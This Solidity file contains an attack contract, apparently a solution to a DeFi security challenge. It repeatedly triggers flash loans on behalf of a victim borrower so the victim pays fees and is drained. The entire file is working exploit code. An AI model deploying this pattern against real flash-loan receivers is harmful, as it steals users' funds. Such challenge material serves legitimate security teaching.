// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveAttacker {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function executeAttack(IERC3156FlashLender lenderPool, IERC3156FlashBorrower victim) external {
        bytes memory emptyCalldata = new bytes(0);
        for (uint256 i = 0; i < 10; i++) {
            lenderPool.flashLoan(victim, ETH, 1, emptyCalldata);
        }
    }
}
